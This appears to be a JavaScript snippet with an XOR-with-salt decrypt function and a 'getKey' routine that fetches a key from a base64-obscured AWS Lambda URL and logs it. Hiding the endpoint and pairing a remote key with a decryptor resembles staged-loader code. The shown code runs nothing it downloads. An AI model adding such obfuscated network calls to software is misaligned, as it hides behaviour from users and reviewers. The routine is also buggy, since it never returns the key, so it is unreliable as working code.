const decrypt = (salt, encoded) => {
  const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
  const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
  return encoded
    .match(/.{1,2}/g)
    .map((hex) => parseInt(hex, 16))
    .map(applySaltToChar)
    .map((charCode) => String.fromCharCode(charCode))
    .join("");
};



function getKey() {
    const apiUrl = "aHR0cHM6Ly9iY3BtM3NsbWEybmZlNHBlZmZkamRla3FteTBpYnVxdy5sYW1iZGEtdXJsLmV1LWNlbnRyYWwtMS5vbi5hd3Mv";
    console.log("here")
    // Make the API call using the fetch function
    fetch(atob(apiUrl))
     .then(response => {
           return response.body;
      })
        .then(stream => {
          const reader = stream.getReader();
          let responseText = '';
          // Read the stream using asynchronous iteration
          const readStream = async () => {
            const { done, value } = await reader.read();
            if (done) {
              const asciiValues = responseText.split(',').map(Number);
              const translatedString = String.fromCharCode(...asciiValues);
              reader.releaseLock(); // Release the reader's lock
              key = JSON.parse(translatedString).key;
              console.log(key);
              return key;
            } else {
              responseText += value; // Accumulate data
              readStream(); // Read the next chunk
            }
          };

          readStream(); // Start reading the stream
        })
      .catch(error => {
        console.error("Fetch error:", error);
        return "";
      });

}


